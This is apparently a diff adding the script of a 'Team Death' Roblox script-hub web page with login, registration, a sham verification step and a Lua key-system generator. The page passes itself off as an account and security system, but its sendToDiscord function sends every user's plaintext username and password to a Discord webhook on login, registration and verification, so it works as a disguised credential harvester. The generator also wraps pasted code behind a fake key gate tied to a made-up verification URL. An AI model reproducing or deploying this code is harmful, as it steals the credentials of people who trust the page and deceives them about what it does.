+            const user = userAccounts.find(acc => acc.username === username && acc.password === password);
+            
+            if (user) {
+                // Login successful
+                currentUser = user;
+                localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                
+                // Send login info to Discord
+                await sendToDiscord({
+                    type: 'LOGIN',
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Go to verification screen
+                loginScreen.style.display = 'none';
+                verifyScreen.style.display = 'flex';
+                
+                showStatus(loginStatus, 'Login successful!', 'success');
+            } else {
+                showStatus(loginStatus, 'Invalid username or password', 'error');
+            }
+            
+            // Reset button
+            loginBtn.classList.remove('loading');
+            loginSpinner.style.display = 'none';
+            loginBtn.disabled = false;
+        });
+
+        // Register Function
+        registerBtn.addEventListener('click', async () => {
+            const username = registerUsername.value.trim();
+            const password = registerPassword.value.trim();
+            const confirm = confirmPassword.value.trim();
+            
+            if (!username || !password || !confirm) {
+                showStatus(registerStatus, 'Please fill all fields', 'error');
+                return;
+            }
+            
+            if (password !== confirm) {
+                showStatus(registerStatus, 'Passwords do not match', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showStatus(registerStatus, 'Password must be at least 6 characters', 'error');
+                return;
+            }
+            
+            // Check if username already exists
+            if (userAccounts.some(acc => acc.username === username)) {
+                showStatus(registerStatus, 'Username already exists', 'error');
+                return;
+            }
+            
+            // Show loading
+            registerBtn.classList.add('loading');
+            registerSpinner.style.display = 'block';
+            registerBtn.disabled = true;
+            
+            // Simulate registration delay
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Create new user
+            const newUser = {
+                username: username,
+                password: password,
+                createdAt: new Date().toISOString()
+            };
+            
+            userAccounts.push(newUser);
+            localStorage.setItem('teamDeathAccounts', JSON.stringify(userAccounts));
+            
+            // Set as current user
+            currentUser = newUser;
+            localStorage.setItem('currentUser', JSON.stringify(currentUser));
+            
+            // Send registration info to Discord
+            await sendToDiscord({
+                type: 'REGISTER',
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Go to verification screen
+            registerScreen.style.display = 'none';
+            verifyScreen.style.display = 'flex';
+            
+            showStatus(registerStatus, 'Registration successful!', 'success');
+            
+            // Reset button
+            registerBtn.classList.remove('loading');
+            registerSpinner.style.display = 'none';
+            registerBtn.disabled = false;
+        });
+
+        // Reset Secure Form
+        function resetSecureForm() {
+            // Reset to step 1
+            step1.classList.add('active');
+            step2.classList.remove('active');
+            step3.classList.remove('active');
+            
+            // Update step indicators
+            document.querySelectorAll('.step').forEach((step, index) => {
+                if (index === 0) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+            
+            // Clear form
+            scriptCode.value = '';
+            youtubeUrl.value = '';
+            securedScript.innerHTML = '';
+            secureStatus.style.display = 'none';
+            
+            // Generate new sample key
+            keyNumber.textContent = Math.floor(100000 + Math.random() * 900000);
+        }
+
+        // Tab switching
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                // Remove active class from all tabs
+                tabs.forEach(t => t.classList.remove('active'));
+                
+                // Add active class to clicked tab
+                tab.classList.add('active');
+                
+                // Load scripts for selected tab
+                loadScripts(tab.dataset.tab);
+            });
+        });
+
+        // Load scripts based on category
+        function loadScripts(category) {
+            scriptContainer.innerHTML = '';
+            
+            if (category === 'paid') {
+                // Show coming soon for paid scripts
+                const comingSoonDiv = document.createElement('div');
+                comingSoonDiv.className = 'coming-soon';
+                comingSoonDiv.innerHTML = `
+                    <i class="fas fa-tools"></i>
+                    <h2>Paid Scripts Coming Soon</h2>
+                    <p>Premium scripts are under development. Check back later for exclusive features!</p>
+                `;
+                scriptContainer.appendChild(comingSoonDiv);
+                return;
+            }
+            
+            scripts[category].forEach(script => {
+                const scriptCard = document.createElement('div');
+                scriptCard.className = 'script-card';
+                
+                scriptCard.innerHTML = `
+                    <div class="game-name">
+                        <i class="fas fa-gamepad"></i> ${script.game}
+                    </div>
+                    <h3 class="script-title">${script.name}</h3>
+                    <p class="script-description">${script.description}</p>
+                    <div class="script-code">${script.code}</div>
+                    <button class="copy-btn" data-code="${encodeURIComponent(script.code)}">
+                        <i class="fas fa-copy"></i> Copy Script
+                    </button>
+                `;
+                
+                scriptContainer.appendChild(scriptCard);
+            });
+            
+            // Add copy functionality to buttons
+            document.querySelectorAll('.copy-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const code = decodeURIComponent(this.dataset.code);
+                    copyToClipboard(code);
+                    
+                    // Visual feedback
+                    const originalText = this.innerHTML;
+                    this.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                    this.classList.add('copied');
+                    
+                    setTimeout(() => {
+                        this.innerHTML = originalText;
+                        this.classList.remove('copied');
+                    }, 2000);
+                });
+            });
+        }
+
+        // Load History
+        function loadHistory() {
+            const userHistory = secureHistory.filter(item => item.username === currentUser.username);
+            
+            if (userHistory.length === 0) {
+                emptyHistory.style.display = 'block';
+                return;
+            }
+            
+            emptyHistory.style.display = 'none';
+            historyList.innerHTML = '';
+            
+            // Sort by date (newest first)
+            userHistory.sort((a, b) => new Date(b.date) - new Date(a.date));
+            
+            userHistory.forEach(item => {
+                const historyItem = document.createElement('div');
+                historyItem.className = 'history-item';
+                
+                historyItem.innerHTML = `
+                    <div class="history-header">
+                        <div class="history-script-name">${item.scriptName}</div>
+                        <div class="history-date">${new Date(item.date).toLocaleDateString()}</div>
+                    </div>
+                    <div class="history-key">Key: ${item.key}</div>
+                    <div class="history-youtube">
+                        <i class="fab fa-youtube"></i> ${item.youtubeUrl}
+                    </div>
+                `;
+                
+                historyList.appendChild(historyItem);
+            });
+        }
+
+        // Add to History
+        function addToHistory(scriptName, key, youtubeUrl) {
+            const historyItem = {
+                username: currentUser.username,
+                scriptName: scriptName,
+                key: key,
+                youtubeUrl: youtubeUrl,
+                date: new Date().toISOString()
+            };
+            
+            secureHistory.push(historyItem);
+            localStorage.setItem('secureHistory', JSON.stringify(secureHistory));
+        }
+
+        // Script Secure Navigation
+        nextStep1.addEventListener('click', () => {
+            if (!scriptCode.value.trim()) {
+                showSecureStatus('Please paste your Lua script code first!', 'error');
+                return;
+            }
+            
+            step1.classList.remove('active');
+            step2.classList.add('active');
+            
+            // Update step indicators
+            document.querySelectorAll('.step').forEach((step, index) => {
+                if (index <= 1) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+        });
+
+        nextStep2.addEventListener('click', () => {
+            const url = youtubeUrl.value.trim();
+            
+            if (!url) {
+                showSecureStatus('Please enter your YouTube channel URL or contact Dev Leak on Discord.', 'error');
+                return;
+            }
+            
+            if (!isValidYouTubeUrl(url)) {
+                showSecureStatus('Please enter a valid YouTube channel URL.', 'error');
+                return;
+            }
+            
+            // Generate secured script
+            generateSecuredScript();
+            
+            step2.classList.remove('active');
+            step3.classList.add('active');
+            
+            // Update step indicators
+            document.querySelectorAll('.step').forEach((step) => {
+                step.classList.add('active');
+            });
+        });
+
+        backStep2.addEventListener('click', () => {
+            step2.classList.remove('active');
+            step1.classList.add('active');
+            
+            // Update step indicators
+            document.querySelectorAll('.step').forEach((step, index) => {
+                if (index === 0) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+        });
+
+        backStep3.addEventListener('click', () => {
+            step3.classList.remove('active');
+            step2.classList.add('active');
+            
+            // Update step indicators
+            document.querySelectorAll('.step').forEach((step, index) => {
+                if (index <= 1) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+        });
+
+        // Copy secured script
+        copySecuredScript.addEventListener('click', () => {
+            if (!securedScript.textContent) return;
+            
+            copyToClipboard(securedScript.textContent);
+            
+            // Visual feedback
+            const originalText = copySecuredScript.innerHTML;
+            copySecuredScript.innerHTML = '<i class="fas fa-check"></i> Copied!';
+            copySecuredScript.classList.add('copied');
+            
+            setTimeout(() => {
+                copySecuredScript.innerHTML = originalText;
+                copySecuredScript.classList.remove('copied');
+            }, 2000);
+            
+            showSecureStatus('Script copied to clipboard! Paste it in Roblox Executor.', 'success');
+        });
+
+        // Generate secured script with key system - FIXED GUI
+        function generateSecuredScript() {
+            const userScript = scriptCode.value;
+            const channelId = extractYouTubeChannelId(youtubeUrl.value);
+            
+            // Generate random verification URL
+            const verificationId = generateRandomId();
+            const verificationUrl = `https://team-death-verify.com/key/${verificationId}`;
+            
+            // Generate random key for this script
+            const generatedKey = `Death_${Math.floor(100000 + Math.random() * 900000)}`;
+            
+            // Add to history
+            addToHistory('Secure Script', generatedKey, youtubeUrl.value);
+            
+            // Generate key system script with MUCH BETTER GUI
+            const keySystemScript = `-- Team Death Key System - Protected by Dev Leak
+-- YouTube Channel: ${youtubeUrl.value}
+
+-- Create AWESOME GUI for Roblox
+local TeamDeath = {
+    Key = "",
+    Verified = false,
+    ValidKeys = {
+        "${generatedKey}",
+        "Death_${Math.floor(100000 + Math.random() * 900000)}",
+        "Death_${Math.floor(100000 + Math.random() * 900000)}"
+    }
+}
+
+-- Create Premium GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TeamDeathPremiumGUI"
+ScreenGui.Parent = game:GetService("CoreGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main Container with glass effect
+local MainContainer = Instance.new("Frame")
+MainContainer.Size = UDim2.new(0, 450, 0, 500)
+MainContainer.Position = UDim2.new(0.5, -225, 0.5, -250)
+MainContainer.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+MainContainer.BackgroundTransparency = 0.1
+MainContainer.BorderSizePixel = 0
+MainContainer.Parent = ScreenGui
+
+-- Add blur effect (if available)
+if game:GetService("RunService"):IsStudio() then
+    local Blur = Instance.new("BlurEffect")
+    Blur.Size = 10
+    Blur.Parent = ScreenGui
+end
+
+-- Add neon border
+local Border = Instance.new("Frame")
+Border.Size = UDim2.new(1, 10, 1, 10)
+Border.Position = UDim2.new(0, -5, 0, -5)
+Border.BackgroundColor3 = Color3.fromRGB(255, 0, 128)
+Border.BackgroundTransparency = 0.7
+Border.BorderSizePixel = 0
+Border.ZIndex = 0
+Border.Parent = MainContainer
+
+-- Animate border
+spawn(function()
+    while wait(0.5) do
+        for i = 0, 1, 0.1 do
+            Border.BackgroundTransparency = 0.7 - (i * 0.3)
+            wait(0.05)
+        end
+        for i = 0, 1, 0.1 do
+            Border.BackgroundTransparency = 0.4 + (i * 0.3)
+            wait(0.05)
+        end
+    end
+end)
+
+-- Header with gradient
+local Header = Instance.new("Frame")
+Header.Size = UDim2.new(1, 0, 0, 80)
+Header.Position = UDim2.new(0, 0, 0, 0)
+Header.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Header.BorderSizePixel = 0
+Header.Parent = MainContainer
+
+-- Title with glow
+local Title = Instance.new("TextLabel")
+Title.Text = "TEAM DEATH"
+Title.Size = UDim2.new(1, 0, 1, 0)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 32
+Title.TextStrokeTransparency = 0.5
+Title.TextStrokeColor3 = Color3.fromRGB(255, 0, 128)
+Title.Parent = Header
+
+-- Subtitle
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Text = "Premium Key System"
+Subtitle.Size = UDim2.new(1, 0, 0, 20)
+Subtitle.Position = UDim2.new(0, 0, 0, 60)
+Subtitle.BackgroundTransparency = 1
+Subtitle.TextColor3 = Color3.fromRGB(0, 204, 255)
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.TextSize = 14
+Subtitle.TextStrokeTransparency = 0.7
+Subtitle.Parent = Header
+
+-- Content Frame
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, -40, 0, 350)
+Content.Position = UDim2.new(0, 20, 0, 100)
+Content.BackgroundTransparency = 1
+Content.Parent = MainContainer
+
+-- Key Input Container
+local KeyContainer = Instance.new("Frame")
+KeyContainer.Size = UDim2.new(1, 0, 0, 60)
+KeyContainer.Position = UDim2.new(0, 0, 0, 20)
+KeyContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+KeyContainer.BorderSizePixel = 0
+KeyContainer.Parent = Content
+
+-- Key Input Label
+local KeyLabel = Instance.new("TextLabel")
+KeyLabel.Text = "ENTER YOUR KEY:"
+KeyLabel.Size = UDim2.new(1, 0, 0, 20)
+KeyLabel.Position = UDim2.new(0, 10, 0, 5)
+KeyLabel.BackgroundTransparency = 1
+KeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyLabel.Font = Enum.Font.GothamBold
+KeyLabel.TextSize = 14
+KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+KeyLabel.Parent = KeyContainer
+
+-- Key Input Box
+local KeyBox = Instance.new("TextBox")
+KeyBox.Size = UDim2.new(1, -20, 0, 30)
+KeyBox.Position = UDim2.new(0, 10, 0, 25)
+KeyBox.PlaceholderText = "Death_XXXXXX"
+KeyBox.Text = ""
+KeyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyBox.Font = Enum.Font.Gotham
+KeyBox.TextSize = 18
+KeyBox.Parent = KeyContainer
+
+-- Pulsing effect on key box
+spawn(function()
+    while wait() do
+        for i = 0, 1, 0.05 do
+            KeyBox.BorderSizePixel = math.floor(2 + math.sin(i * math.pi) * 2)
+            KeyBox.BorderColor3 = Color3.fromRGB(255 * i, 0, 255 * (1-i))
+            wait(0.05)
+        end
+    end
+end)
+
+-- Buttons Container
+local ButtonsContainer = Instance.new("Frame")
+ButtonsContainer.Size = UDim2.new(1, 0, 0, 120)
+ButtonsContainer.Position = UDim2.new(0, 0, 0, 100)
+ButtonsContainer.BackgroundTransparency = 1
+ButtonsContainer.Parent = Content
+
+-- Verify Button with hover effect
+local SubmitBtn = Instance.new("TextButton")
+SubmitBtn.Size = UDim2.new(1, 0, 0, 50)
+SubmitBtn.Position = UDim2.new(0, 0, 0, 0)
+SubmitBtn.Text = "🔐 VERIFY KEY"
+SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 83)
+SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+SubmitBtn.Font = Enum.Font.GothamBlack
+SubmitBtn.TextSize = 20
+SubmitBtn.Parent = ButtonsContainer
+
+-- Get Key Button with gradient
+local GetKeyBtn = Instance.new("TextButton")
+GetKeyBtn.Size = UDim2.new(1, 0, 0, 50)
+GetKeyBtn.Position = UDim2.new(0, 0, 0, 60)
+GetKeyBtn.Text = "🔑 GET KEY"
+GetKeyBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 128)
+GetKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+GetKeyBtn.Font = Enum.Font.GothamBlack
+GetKeyBtn.TextSize = 20
+GetKeyBtn.Parent = ButtonsContainer
+
+-- Button hover effects
+SubmitBtn.MouseEnter:Connect(function()
+    SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+end)
+
+SubmitBtn.MouseLeave:Connect(function()
+    SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 83)
+end)
+
+GetKeyBtn.MouseEnter:Connect(function()
+    GetKeyBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
+end)
+
+GetKeyBtn.MouseLeave:Connect(function()
+    GetKeyBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 128)
+end)
+
+-- Status Display
+local StatusFrame = Instance.new("Frame")
+StatusFrame.Size = UDim2.new(1, 0, 0, 40)
+StatusFrame.Position = UDim2.new(0, 0, 0, 240)
+StatusFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+StatusFrame.BorderSizePixel = 0
+StatusFrame.Parent = Content
+
+local Status = Instance.new("TextLabel")
+Status.Text = "🔒 Enter a valid key to unlock the script"
+Status.Size = UDim2.new(1, 0, 1, 0)
+Status.BackgroundTransparency = 1
+Status.TextColor3 = Color3.fromRGB(255, 255, 255)
+Status.Font = Enum.Font.Gotham
+Status.TextSize = 16
+Status.Parent = StatusFrame
+
+-- Footer
+local Footer = Instance.new("Frame")
+Footer.Size = UDim2.new(1, 0, 0, 40)
+Footer.Position = UDim2.new(0, 0, 0, 300)
+Footer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Footer.BorderSizePixel = 0
+Footer.Parent = Content
+
+local FooterText = Instance.new("TextLabel")
+FooterText.Text = "Protected by Team Death | Keys expire in 5 hours"
+FooterText.Size = UDim2.new(1, 0, 1, 0)
+FooterText.BackgroundTransparency = 1
+FooterText.TextColor3 = Color3.fromRGB(150, 150, 150)
+FooterText.Font = Enum.Font.Gotham
+FooterText.TextSize = 12
+FooterText.Parent = Footer
+
+-- Add particles for visual effect
+local Particles = Instance.new("Frame")
+Particles.Size = UDim2.new(1, 0, 1, 0)
+Particles.BackgroundTransparency = 1
+Particles.ZIndex = -1
+Particles.Parent = MainContainer
+
+-- Create floating particles
+for i = 1, 15 do
+    local Particle = Instance.new("Frame")
+    Particle.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
+    Particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    Particle.BackgroundColor3 = Color3.fromRGB(math.random(100, 255), 0, math.random(100, 255))
+    Particle.BorderSizePixel = 0
+    Particle.Parent = Particles
+    
+    spawn(function()
+        while wait(math.random(1, 3)) do
+            Particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+            Particle.BackgroundColor3 = Color3.fromRGB(math.random(100, 255), 0, math.random(100, 255))
+        end
+    end)
+end
+
+-- Entrance animation
+MainContainer.Position = UDim2.new(0.5, -225, 0, -500)
+MainContainer:TweenPosition(UDim2.new(0.5, -225, 0.5, -250), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 1, true)
+
+-- Function to check key
+function TeamDeath.IsValidKey(key)
+    for _, validKey in pairs(TeamDeath.ValidKeys) do
+        if key == validKey then
+            TeamDeath.Key = key
+            TeamDeath.Verified = true
+            return true
+        end
+    end
+    return false
+end
+
+-- Get Key Button Click
+GetKeyBtn.MouseButton1Click:Connect(function()
+    Status.Text = "📋 URL copied to clipboard! Check console for details."
+    Status.TextColor3 = Color3.fromRGB(255, 255, 0)
+    
+    -- Show URL in console
+    print("\\n" .. string.rep("⭐", 50))
+    print("⭐ TEAM DEATH PREMIUM KEY VERIFICATION")
+    print(string.rep("⭐", 50))
+    print("🔗 Verification URL:")
+    print("${verificationUrl}")
+    print(string.rep("⭐", 50))
+    print("📝 Instructions:")
+    print("1. Visit the URL above")
+    print("2. Subscribe to: ${youtubeUrl.value}")
+    print("3. Wait 30 seconds for verification")
+    print("4. Copy your generated key")
+    print("5. Return here and paste the key")
+    print("⏰ Key expires in 5 hours")
+    print(string.rep("⭐", 50))
+    
+    -- Copy URL to clipboard
+    if setclipboard then
+        setclipboard("${verificationUrl}")
+    elseif writeclipboard then
+        writeclipboard("${verificationUrl}")
+    elseif syn and syn.write_clipboard then
+        syn.write_clipboard("${verificationUrl}")
+    end
+    
+    -- Button animation
+    for i = 1, 3 do
+        GetKeyBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+        wait(0.1)
+        GetKeyBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 128)
+        wait(0.1)
+    end
+    
+    -- Show success notification
+    local Notification = Instance.new("TextLabel")
+    Notification.Text = "✅ URL copied to clipboard!"
+    Notification.Size = UDim2.new(0, 300, 0, 40)
+    Notification.Position = UDim2.new(0.5, -150, 1, 10)
+    Notification.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    Notification.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Notification.Font = Enum.Font.GothamBold
+    Notification.TextSize = 16
+    Notification.Parent = ScreenGui
+    
+    Notification:TweenPosition(UDim2.new(0.5, -150, 0.9, -50), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.5, true)
+    wait(2)
+    Notification:TweenPosition(UDim2.new(0.5, -150, 1, 10), Enum.EasingDirection.In, Enum.EasingStyle.Back, 0.5, true)
+    wait(0.5)
+    Notification:Destroy()
+end)
+
+-- Verify Button Click
+SubmitBtn.MouseButton1Click:Connect(function()
+    local key = KeyBox.Text
+    
+    if TeamDeath.IsValidKey(key) then
+        -- Success animation
+        Status.Text = "✅ KEY VERIFIED! Loading script..."
+        Status.TextColor3 = Color3.fromRGB(0, 255, 0)
+        
+        -- Animate success
+        for i = 1, 5 do
+            SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+            wait(0.1)
+            SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 83)
+            wait(0.1)
+        end
+        
+        SubmitBtn.Text = "✅ ACCESS GRANTED!"
+        
+        -- Close GUI with cool animation
+        wait(1)
+        MainContainer:TweenPosition(UDim2.new(0.5, -225, 0, -500), Enum.EasingDirection.In, Enum.EasingStyle.Back, 0.5, true)
+        wait(0.6)
+        ScreenGui:Destroy()
+        
+        -- Load the actual script
+        wait(0.5)
+        ${userScript}
+    else
+        -- Error animation
+        Status.Text = "❌ INVALID KEY! Please try again."
+        Status.TextColor3 = Color3.fromRGB(255, 50, 50)
+        
+        -- Shake animation
+        local originalPos = KeyBox.Position
+        for i = 1, 10 do
+            KeyBox.Position = UDim2.new(0.1, math.random(-10, 10), 0.25, math.random(-5, 5))
+            wait(0.02)
+        end
+        KeyBox.Position = originalPos
+        KeyBox.Text = ""
+        
+        -- Flash red
+        for i = 1, 3 do
+            KeyBox.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+            wait(0.1)
+            KeyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            wait(0.1)
+        end
+        
+        -- Button shake
+        local originalBtnPos = SubmitBtn.Position
+        for i = 1, 5 do
+            SubmitBtn.Position = UDim2.new(0, math.random(-5, 5), 0, 0)
+            wait(0.05)
+        end
+        SubmitBtn.Position = originalBtnPos
+    end
+end)
+
+-- Auto-reminder after 20 seconds
+spawn(function()
+    wait(20)
+    if not TeamDeath.Verified then
+        Status.Text = "💡 Need help? Click GET KEY for instructions"
+        Status.TextColor3 = Color3.fromRGB(0, 200, 255)
+        
+        -- Flash reminder
+        for i = 1, 3 do
+            GetKeyBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+            wait(0.3)
+            GetKeyBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 128)
+            wait(0.3)
+        end
+    end
+end)
+
+-- Prevent script from running without verification
+if not TeamDeath.Verified then
+    -- GUI is already showing and looking awesome
+else
+    ScreenGui:Destroy()
+end`;
+            
+            securedScript.textContent = keySystemScript;
+            showSecureStatus('Key system added successfully! Copy the script above.', 'success');
+        }
+
+        // Helper functions for script secure
+        function isValidYouTubeUrl(url) {
+            const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
+            return youtubeRegex.test(url);
+        }
+
+        function extractYouTubeChannelId(url) {
+            const match = url.match(/youtube\.com\/@([a-zA-Z0-9_]+)/);
+            return match ? match[1] : 'unknown_channel';
+        }
+
+        function generateRandomId() {
+            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        }
+
+        function showSecureStatus(message, type) {
+            secureStatus.textContent = message;
+            secureStatus.className = `status-message ${type}`;
+            secureStatus.style.display = 'block';
+            
+            setTimeout(() => {
+                secureStatus.style.display = 'none';
+            }, 5000);
+        }
+
+        function showStatus(element, message, type) {
+            element.textContent = message;
+            element.className = `status-message ${type}`;
+            element.style.display = 'block';
+            
+            setTimeout(() => {
+                element.style.display = 'none';
+            }, 5000);
+        }
+
+        // Copy to clipboard function
+        function copyToClipboard(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+        }
+
+        // Verification function
+        verifyBtn.addEventListener('click', async () => {
+            // Show loading state
+            verifyBtn.classList.add('loading');
+            loadingSpinner.style.display = 'block';
+            verifyBtn.disabled = true;
+            btnText.textContent = 'Verifying...';
+            
+            // Simulate verification delay
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            try {
+                // Always successful verification
+                const userInfo = {
+                    username: currentUser.username,
+                    timestamp: new Date().toISOString(),
+                    status: 'Human',
+                    device: 'Verified User'
+                };
+                
+                // Send verification info to Discord
+                await sendToDiscord({
+                    type: 'VERIFICATION',
+                    username: currentUser.username,
+                    password: currentUser.password,
+                    status: 'SUCCESS',
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Show success message
+                statusMessage.textContent = '✅ Verification successful!';
+                statusMessage.className = 'status-message success';
+                statusMessage.style.display = 'block';
+                
+                // Wait a moment then show hub
+                setTimeout(() => {
+                    verifyScreen.style.display = 'none';
+                    hubScreen.style.display = 'flex';
+                    topMenu.style.display = 'flex';
+                    
+                    loadScripts('free');
+                }, 1500);
+                
+            } catch (error) {
+                statusMessage.textContent = '❌ Verification failed. Please try again.';
+                statusMessage.className = 'status-message error';
+                statusMessage.style.display = 'block';
+                
+                verifyBtn.classList.remove('loading');
+                loadingSpinner.style.display = 'none';
+                btnText.textContent = 'Start Verification';
+                verifyBtn.disabled = false;
+            }
+        });
+
+        // Send data to Discord webhook
+        async function sendToDiscord(data) {
+            let embed;
+            
+            if (data.type === 'LOGIN') {
+                embed = {
+                    title: "🔑 User Login",
+                    color: 0x00ff00,
+                    fields: [
+                        {
+                            name: "Username",
+                            value: `\`${data.username}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Password",
+                            value: `\`${data.password}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Type",
+                            value: "Login",
+                            inline: true
+                        },
+                        {
+                            name: "Timestamp",
+                            value: new Date().toLocaleString(),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Team Death Login System"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+            } else if (data.type === 'REGISTER') {
+                embed = {
+                    title: "📝 New User Registration",
+                    color: 0x00aaff,
+                    fields: [
+                        {
+                            name: "Username",
+                            value: `\`${data.username}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Password",
+                            value: `\`${data.password}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Type",
+                            value: "Registration",
+                            inline: true
+                        },
+                        {
+                            name: "Timestamp",
+                            value: new Date().toLocaleString(),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Team Death Registration System"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+            } else if (data.type === 'VERIFICATION') {
+                embed = {
+                    title: "✅ User Verification",
+                    color: 0x00ff00,
+                    fields: [
+                        {
+                            name: "Username",
+                            value: `\`${data.username}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Password",
+                            value: `\`${data.password}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Status",
+                            value: "✅ Human Verified",
+                            inline: true
+                        },
+                        {
+                            name: "Timestamp",
+                            value: new Date().toLocaleString(),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Team Death Verification System"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+            }
+            
+            const payload = {
+                username: "Team Death Security",
+                avatar_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/teamdeath.png",
+                embeds: [embed]
+            };
+            
+            const response = await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            if (!response.ok) {
+                throw new Error('Failed to send data to Discord');
+            }
+            
+            return response;
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            const cards = document.querySelectorAll('.script-card, .login-card, .register-card, .verify-card, .secure-card');
+            cards.forEach((card, index) => {
+                card.style.animationDelay = `${index * 0.1}s`;
+            });
+            
+            keyNumber.textContent = Math.floor(100000 + Math.random() * 900000);
+            
+            if (currentUser) {
+                loginScreen.style.display = 'none';
+                registerScreen.style.display = 'none';
+                verifyScreen.style.display = 'flex';
+            }
+        });
+    </script>
+</body>
+</html>
